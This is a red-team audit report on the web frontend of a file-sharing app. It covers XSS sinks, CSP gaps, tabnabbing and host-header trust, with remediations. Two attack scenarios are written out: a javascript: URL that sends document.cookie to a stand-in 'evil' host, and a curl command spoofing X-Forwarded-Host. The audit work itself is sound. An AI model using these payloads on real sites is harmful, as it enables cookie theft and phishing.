# Red Team Report — A7: Web Frontend

## Summary

I audited the Ouitransfer Next.js 15 (App Router) + React 19 frontend across XSS sinks,
open-redirect surfaces, the dev proxy / Edge middleware (`proxy.ts`), CSP and security
headers, token/secret storage, CSRF handling, and SSRF/header-smuggling vectors. The
frontend is, on the whole, defensively written: there is **not a single
`dangerouslySetInnerHTML`, `innerHTML`, `eval`, `new Function`, `document.write`, or
`postMessage` handler** anywhere in `apps/web/src`, all user-derived strings (filenames,
share names, descriptions, breadcrumbs) are rendered through React's auto-escaping JSX,
auth tokens live exclusively in httpOnly cookies (never `localStorage`/`document.cookie`),
CSRF uses an in-memory double-submit token, and post-login navigation is hardcoded to
`/dashboard` (no `returnTo`/`redirect` parameter exists to abuse, eliminating the classic
open-redirect). File downloads are served from cross-origin presigned S3 URLs forced to
`Content-Disposition: attachment`, which neutralises stored-XSS-via-uploaded-file in most
render paths.

The findings that remain are concentrated in three areas: (1) the proxy/middleware CSP
omits `object-src`/`frame-src`/`worker-src`, weakening the PDF-preview and plugin sink
defenses and leaving a `connect-src`/`img-src` that trusts an operator-supplied origin
list; (2) several `target="_blank"` links — one of them pointed at an
**admin-configurable, unvalidated URL** (`footerUrl`) rendered through a Next.js `<Link>`
that does *not* auto-add `rel="noopener"` and does not block `javascript:` schemes; and
(3) `getBaseUrl()` trusts `X-Forwarded-Host`/`X-Forwarded-Proto` unconditionally for
OpenGraph metadata. Client-side route gating in `proxy.ts` is also, by design, only a UX
convenience and must be backed by server checks (it is — but the admin-path assumption is
worth flagging for the server team).

### Counts by severity
- Critical: 0
- High: 1
- Medium: 4
- Low: 4
- Informational / Tested-OK: see final section

---

## Dangerous-sink inventory

| Sink | Searched | Location(s) | Tainted? |
|------|----------|-------------|----------|
| `dangerouslySetInnerHTML` | yes | — none — | n/a |
| `innerHTML` / `outerHTML` / `insertAdjacentHTML` | yes | — none — | n/a |
| `document.write` | yes | — none — | n/a |
| `eval` / `new Function` | yes | — none — | n/a |
| `postMessage` / `addEventListener("message")` | yes | — none — | n/a |
| markdown / `DOMPurify` / `marked` / `react-markdown` | yes | — none (no HTML rendering libs) — | n/a |
| `<iframe src>` | yes | `components/modals/previews/pdf-preview.tsx:27,48` | blob: URL from forced `application/pdf` blob (low) |
| `<object data>` | yes | `components/modals/previews/pdf-preview.tsx:42` | same as above |
| `URL.createObjectURL` | yes | `use-file-preview.ts:107,129,155`; `profile/hooks/use-two-factor.ts:184` | blobs are typed/forced; QR is server bytes |
| `window.location.href =` | yes | `config/api.ts:213,221`; `components/layout/navbar.tsx:54` | constant strings only — safe |
| `router.push/replace(x)` | yes | many (callbacks, login, files) | all constants or validated alias/folder ids — safe |
| `window.open(url, ...)` | yes | `reverse-share-card.tsx:174` (noopener), `reverse-share-details-modal.tsx:141`, `share-details-links-section.tsx:32`, `audit-log-export.tsx:37` | own-origin/share links; two lack noopener (low) |
| `target="_blank"` w/o `rel` | yes | `components/ui/default-footer.tsx:36` (admin URL), `(shares)/r/[alias]/components/transparent-footer.tsx:36`, `add-provider-form.tsx:207` (rel present) | footer is tainted (admin) |
| `<img src={userData}>` / `AvatarImage` | yes | `navbar.tsx:76,92`; `users-table.tsx:57`; `group-detail-modal.tsx:129`; `profile-picture.tsx:83` | `<img>` cannot execute scripts; safe even with `javascript:` |
| `document.cookie =` | yes | `language-switcher.tsx:63` | locale value, `encodeURIComponent`'d, non-sensitive |
| `X-Forwarded-Host` trust | yes | `lib/app-info.ts:50-51` | tainted → OG metadata only |
| `decodeURIComponent(param)` → toast | yes | `app/login/hooks/use-login.ts:75` | rendered as toast *text* (React-escaped) — safe |
| `localStorage`/`sessionStorage` for tokens | yes | — none — | tokens are httpOnly cookies only |
| `NEXT_PUBLIC_*` secrets | yes | only `APP_VERSION`, `DEFAULT_LANGUAGE`, `LOG_LEVEL` | no secrets bundled |

---

## Findings

### [HIGH] Admin-configurable footer URL is rendered in a `target="_blank"` Next.js `<Link>` with no `rel` and no scheme validation — ID A7-01
- **Severity:** High (stored, reverse-tabnabbing + potential `javascript:`/`data:` link)
- **Location:** `apps/web/src/components/ui/default-footer.tsx:28,35-41` (also `transparent-footer.tsx:36`)
- **OWASP:** A03 Injection (DOM) / A01 Broken Access Control (operator-supplied content)
- **Description:** The footer link href is `displayUrl = footerUrl || "#"`, where `footerUrl`
  comes from `useSecureConfigValue("footerUrl")` — a value set by an administrator in
  Settings and stored server-side. It is passed verbatim to a Next.js `<Link href={...}
  target="_blank">`. Two problems:
  1. **No `rel="noopener noreferrer"`.** Next.js `<Link>` (unlike a server-rendered `<a>`)
     does **not** automatically inject `rel="noopener"` when `target="_blank"`. The opened
     page therefore receives a live `window.opener` reference and can navigate the original
     tab (reverse tabnabbing / phishing redirect of an authenticated user).
  2. **No scheme allow-list.** `footerUrl` is not validated to be `http(s)`. An admin (or
     anyone who can write the `footerUrl` config — see the server-side config audit) can
     set `javascript:fetch('/api/...')...` or a `data:` URL. A Next `<Link>` will render
     this href; clicking executes script in the app origin (DOM-XSS), defeating the strong
     no-`dangerouslySetInnerHTML` posture of the rest of the app.
- **Attack scenario:** A malicious or compromised admin sets
  `footerUrl = javascript:document.location='https://evil/?c='+document.cookie` (note:
  the JWT is httpOnly so not in `document.cookie`, but CSRF token / app state and any
  non-httpOnly data are reachable, and the script runs with full same-origin privileges to
  call the API as the victim). Even with a benign-but-attacker-controlled `https://evil`
  URL, reverse tabnabbing lets `evil` rewrite the opener tab to a fake login page.
- **Evidence:**
  ```tsx
  // default-footer.tsx
  const displayUrl = footerUrl || "#";
  <Link target="_blank" className="text-current" href={displayUrl}>
  ```
- **Remediation:** (a) Add `rel="noopener noreferrer"` to every `target="_blank"` link.
  (b) Validate `footerUrl` against an `^https?://` allow-list (reject `javascript:`,
  `data:`, `vbscript:`, protocol-relative `//`) both at the config-write API and at render
  time; fall back to `#`/disable the link if invalid.

### [MEDIUM] Frontend CSP omits `object-src`, `frame-src`, `worker-src`, `frame-ancestors` fallback for plugins; relies on `default-src` for the PDF-preview sink — ID A7-02
- **Severity:** Medium
- **Location:** `apps/web/src/proxy.ts:85-107`
- **OWASP:** A05 Security Misconfiguration
- **Description:** The CSP assembled in `addSecurityHeaders` sets `default-src 'self'`,
  `script-src`, `style-src`, `img-src`, `font-src`, `connect-src`, `form-action`,
  `frame-ancestors 'none'`, `base-uri 'self'` — but has **no explicit `object-src 'none'`**
  and **no `frame-src`/`child-src`/`worker-src`**. `object-src` is a notorious CSP gap:
  many bypass techniques abuse `<object>`/`<embed>` when `object-src` is unset (it does not
  inherit a useful default in all browsers / for plugin content). The PDF preview uses
  exactly an `<object data=...>` plus `<iframe src=blob:...>` (`pdf-preview.tsx:27,42,48`).
  With `default-src 'self'`, a `blob:` framed document is same-origin and allowed; combined
  with the missing `object-src`, a crafted PDF/plugin payload has more room than necessary.
- **Attack scenario:** Defense-in-depth gap rather than a direct exploit given the
  attachment disposition (A7-04 mitigates execution), but if any future code path serves
  preview bytes inline same-origin, the missing `object-src 'none'` removes a key backstop.
- **Evidence:** `proxy.ts:85-107` — directive list contains no `object-src`/`frame-src`/`worker-src`.
- **Remediation:** Add `object-src 'none'`, `frame-src 'self' blob:` (or `'none'` if PDF
  preview is moved to a server-rendered viewer), `worker-src 'self' blob:`, and
  `manifest-src 'self'`. Consider `script-src` nonces to drop `'unsafe-inline'` long-term.

### [MEDIUM] CSP `script-src 'unsafe-inline'` permanently weakens XSS containment — ID A7-03
- **Severity:** Medium
- **Location:** `apps/web/src/proxy.ts:91,93`
- **OWASP:** A05 Security Misconfiguration / A03 Injection
- **Description:** `script-src 'self' 'unsafe-inline'` (and `style-src 'unsafe-inline'`).
  `'unsafe-inline'` means that *if* any injection point is ever introduced (a future
  `dangerouslySetInnerHTML`, a templated inline `<script>`, an attribute-injection), the
  CSP provides **zero** protection — inline script executes freely. The comment claims App
  Router "requires" inline scripts; this is true for the hydration bootstrap, but Next.js
  supports **nonce-based** CSP (`'strict-dynamic'` + per-request nonce) which would let the
  framework's own inline scripts run while blocking attacker inline script.
- **Attack scenario:** Today the app has no HTML-injection sink, so this is latent. But it
  converts any future reflected/stored HTML injection (e.g. A7-01 if exploited) from
  "blocked by CSP" into "fully exploitable."
- **Evidence:** `proxy.ts:91` — `` `script-src 'self' 'unsafe-inline'${dev?...}` ``.
- **Remediation:** Migrate to nonce-based CSP: generate a per-request nonce in the proxy,
  inject it via Next's `headers()`/`nonce` propagation, and replace `'unsafe-inline'` with
  `'nonce-...' 'strict-dynamic'` for `script-src`.

### [MEDIUM] Operator-controlled origins are concatenated into `img-src`/`connect-src` (CSP injection if value is loosely set) — ID A7-04
- **Severity:** Medium
- **Location:** `apps/web/src/proxy.ts:95,99`; validation in `apps/web/src/env.ts` (`CSP_STORAGE_ORIGINS` refine)
- **OWASP:** A05 Security Misconfiguration
- **Description:** `CSP_STORAGE_ORIGINS` is interpolated directly into the `img-src` and
  `connect-src` directives. There **is** a Zod `refine` in `env.ts` requiring each
  space-separated token to match `^https?://[a-z0-9.-]+(:\d+)?$`, which is good and blocks
  the `;`/newline CSP-injection class. The residual risk is operational: the regex permits
  any host (e.g. a typo or overly broad value like a shared CDN) to become an allowed
  `connect-src` destination for the whole app — broadening where the SPA may exfiltrate to
  if an XSS ever lands. It also does not constrain to the actual storage origin.
- **Attack scenario:** If an operator sets `CSP_STORAGE_ORIGINS` to a wildcard-ish shared
  host or an attacker-influenced value, `connect-src` now trusts it; an injected script
  could `fetch()` victim data to that origin within CSP.
- **Evidence:** `proxy.ts:95` (`img-src ... ${env.CSP_STORAGE_ORIGINS}`), `:99`
  (`connect-src 'self'${... CSP_STORAGE_ORIGINS}`); `env.ts` refine regex.
- **Remediation:** Keep the refine (it is correct). Additionally document that this value
  must equal the storage origin only, and prefer separating `img-src` (presigned download
  origin) from `connect-src` (presigned upload origin) so each is minimal. Reject `*`.

### [MEDIUM] `getBaseUrl()` trusts `X-Forwarded-Host` / `X-Forwarded-Proto` without an allow-list (host-header injection into OpenGraph URLs) — ID A7-05
- **Severity:** Medium (contained to metadata, but classic host-header poisoning shape)
- **Location:** `apps/web/src/lib/app-info.ts:48-53`, consumed in
  `app/(shares)/s/[alias]/layout.tsx:51-52` and `app/(shares)/r/[alias]/layout.tsx:44`
- **OWASP:** A05 Security Misconfiguration / A10-ish (server-side request context trust)
- **Description:** `getBaseUrl` reads `x-forwarded-proto` and `x-forwarded-host` (falling
  back to `host`) with no validation against a configured canonical host. On the public
  share pages this base URL builds the OpenGraph/Twitter `url` (`${baseUrl}/s/${alias}`).
  If the deployment's reverse proxy does not strip client-supplied `X-Forwarded-Host`, an
  attacker can set it on a request to the share page and poison the canonical/OG URL that
  link-unfurlers and crawlers consume — a building block for share-link phishing and, in
  some configurations, cache poisoning of the share preview.
- **Attack scenario:** `curl -H 'X-Forwarded-Host: evil.example' https://app/s/abc-de` →
  the rendered `<meta property="og:url" content="https://evil.example/s/abc-de">`; a chat
  preview of the legitimate share now advertises the attacker domain.
- **Evidence:**
  ```ts
  const protocol = headersList.get("x-forwarded-proto") || "http";
  const host = headersList.get("x-forwarded-host") || headersList.get("host") || "localhost:3000";
  ```
- **Remediation:** Validate the derived host against a configured allow-list / canonical
  `APP_URL` env var; only honor `X-Forwarded-*` when the immediate proxy is trusted (and
  ensure the edge proxy overwrites, not appends, these headers). For metadata, prefer a
  fixed canonical base from config.

### [LOW] `window.open` without `noopener` on reverse-share view links — ID A7-06
- **Severity:** Low (reverse tabnabbing)
- **Location:** `apps/web/src/app/(shares)/reverse-shares/components/reverse-share-details-modal.tsx:141`
  (`window.open(link, "_blank")`); `apps/web/src/components/modals/share-details/share-details-links-section.tsx:32`
  (`window.open(shareLink, "_blank")`); `apps/web/src/app/admin/audit/components/audit-log-export.tsx:37`
- **OWASP:** A05 / A03 (DOM)
- **Description:** These open own-origin share URLs (or an export blob) in a new tab without
  the `"noopener,noreferrer"` window-feature argument, unlike the correct usage in
  `reverse-share-card.tsx:174`. Own-origin targets make this lower risk, but the share URL
  family ultimately renders content/metadata and the pattern should be uniform.
- **Evidence:** `window.open(link, "_blank")` (no feature string) vs the correct
  `window.open(url, "_blank", "noopener,noreferrer")` at `reverse-share-card.tsx:174`.
- **Remediation:** Add `"noopener,noreferrer"` as the third argument to every
  `window.open` and `rel="noopener noreferrer"` to every `<a target="_blank">`.

### [LOW] API rewrites in the proxy receive no security headers — ID A7-07
- **Severity:** Low (informational/defense-in-depth)
- **Location:** `apps/web/src/proxy.ts:119-123`
- **OWASP:** A05 Security Misconfiguration
- **Description:** The `/api/*` branch does `NextResponse.rewrite(...)` and returns **without**
  calling `addSecurityHeaders`. API responses therefore depend entirely on the Fastify
  `helmet` config for headers when reached through the Next proxy (dev / no-Traefik). This
  is acceptable *iff* the server always sets its own headers, but it means the web tier
  contributes nothing and a server misconfig has no proxy backstop. The upstream target is
  `env.API_BASE_URL` (server-controlled, not client-influenced) — **no SSRF**: the client
  cannot redirect the rewrite to an arbitrary host. Confirmed safe on the SSRF axis.
- **Evidence:** `proxy.ts:121-122` builds `rewriteUrl` from `env.API_BASE_URL` only.
- **Remediation:** Optional — rely on server helmet (correct), or add a minimal header set
  to the rewrite for defense-in-depth. No action required for SSRF.

### [LOW] Reflected `message` query param shown in login toast — ID A7-08
- **Severity:** Low (no XSS; UX/social-engineering only)
- **Location:** `apps/web/src/app/login/hooks/use-login.ts:74-75`
- **OWASP:** A03 (reflected content)
- **Description:** `message = decodeURIComponent(messageParam)` is rendered via
  `toast.error(message)`. `sonner` renders the string as **text** (React children), so this
  is **not** XSS. However it lets an attacker craft `/login?error=x&message=Your+account+was+
  compromised,+call+1-800-...` to display an arbitrary attacker message on the legitimate
  login page (phishing / fake support).
- **Evidence:** `use-login.ts:74-76` then `toast.error(message)` at `:83`.
- **Remediation:** Do not render free-form `message` from the URL. Map `error` codes to
  i18n keys only (the `else` branch already does this); drop the `messageParam` passthrough.

---

## Tested-and-OK

- **No HTML-injection sinks.** Zero `dangerouslySetInnerHTML`/`innerHTML`/`document.write`/
  `eval`/`new Function`/`insertAdjacentHTML` in `apps/web/src`. No markdown/HTML renderer
  dependency. All user data (filenames, share `name`/`description`, folder breadcrumbs,
  display names) rendered as JSX text → React auto-escaped. (`share-details.tsx:76,89,146,152`,
  `text-preview.tsx:36`).
- **Open redirect — none found.** Post-login goes to a constant `/dashboard`
  (`use-login.ts:149,214`); OAuth/OIDC callback pages hardcode `/dashboard` or `/login`
  and never read a redirect/`returnTo`/`next` param (`auth/callback/page.tsx`,
  `auth/oidc/callback/page.tsx`). No `router.push(userInput)` / `location = userInput`
  anywhere — all targets are constants or validated alias/folder identifiers.
- **Token storage.** JWT and refresh token are httpOnly cookies set only by the Fastify
  server; the callback pages explicitly never call `document.cookie` for auth
  (`auth/callback/page.tsx:26-28`). No tokens in `localStorage`/`sessionStorage`. The only
  `document.cookie` write is the non-sensitive `NEXT_LOCALE` (`language-switcher.tsx:63`),
  `SameSite=Lax`, `Secure` on https, value `encodeURIComponent`'d.
- **CSRF.** Double-submit: token fetched from `/api/csrf-token`, held in a module variable
  (not a cookie), attached as `X-CSRF-Token` on all non-GET/HEAD/OPTIONS requests via an
  axios request interceptor (`config/api.ts:34-79`). Cache flushed only on CSRF-specific
  403 (`:154-162`). No mutation path bypasses `apiInstance`.
- **Uploaded-file XSS largely mitigated server-side.** Download/preview URLs are
  cross-origin presigned S3 URLs forced to `Content-Disposition: attachment`
  (`apps/server/src/providers/s3-storage.provider.ts:48,67,78,81`), so SVG/HTML files
  download rather than render. SVG is classified as `image` first (`file-types.ts:8`) and
  shown via `<img>`/Next `<Image>` (cannot execute script). PDF blobs are reconstructed
  with a forced `type:"application/pdf"` before framing (`use-file-preview.ts:154`).
- **No SSRF via the proxy.** The `/api/*` rewrite target is built solely from
  `env.API_BASE_URL`; the client cannot influence the upstream host
  (`proxy.ts:119-123`). No header smuggling of upstream-trusted headers from this layer.
- **No client secrets bundled.** Only `NEXT_PUBLIC_APP_VERSION`,
  `NEXT_PUBLIC_DEFAULT_LANGUAGE`, `NEXT_PUBLIC_LOG_LEVEL` are referenced — all non-secret.
- **No prototype pollution / no `postMessage`.** No dynamic key assignment from parsed
  JSON into objects; `JSON.parse` is used for text-preview formatting and drag-data only.
  No `message` event listeners.
- **Middleware route gating is correct as UX (server must enforce).** `proxy.ts` verifies
  the JWT with `jose` against `JWT_SECRET`, strips the @fastify/cookie signature correctly
  (`extractJwtFromSignedCookie`), and gates admin paths on `payload.isAdmin`
  (`:160-163`). This is client-trust-free at the edge (signature verified) but remains a
  UX gate — server endpoints must independently enforce admin authorization (cross-ref the
  server/auth audit; the admin UI assumes server-side checks exist).
- **`X-Frame-Options: DENY` + `frame-ancestors 'none'`** set on all page responses
  (`proxy.ts:71-72,103`) — clickjacking covered. `X-Content-Type-Options: nosniff`,
  `Referrer-Policy`, `Permissions-Policy` all present.
- **Avatar/logo images** (`navbar.tsx:76,92`, `users-table.tsx:57`, `profile-picture.tsx:83`)
  use `<img>`/Radix `AvatarImage` — a `javascript:`/`data:` value cannot execute in an
  `img src`. Next `<Image>` optimizer is bounded by `images.remotePatterns`
  (`next.config.ts`) and preview images use `unoptimized` (no optimizer SSRF).
